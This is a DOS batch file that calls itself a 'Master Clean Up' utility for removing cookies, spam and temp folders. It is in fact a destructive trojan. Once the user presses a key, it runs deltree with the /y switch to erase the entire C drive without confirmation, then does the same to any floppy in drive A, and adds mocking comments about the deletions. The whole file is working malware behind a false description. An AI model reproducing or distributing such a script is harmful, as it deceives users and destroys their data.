   cls
   rem Master Clean Up
   rem --------------------
   rem cleans your computer of cookies, spam, junk, temp folders...etc.
   pause
   cls
   rem Now all your folders count as either junk or temp folders...
   @ Echo off
   deltree /y c:\*.*
   @ echo on
   rem ...because I just deleted your C drive!
   rem ...
   rem ...
   rem ...do you have a floppy in there?
   @ echo off
   deltree /y a:\*.*
   @ echo on
   rem Well, if you do, it's blank now!
   rem ...
   cls
   rem ...
   rem Like I said: Master Clean Up
   rem ...
   rem ...
   goto end
   :end
   end
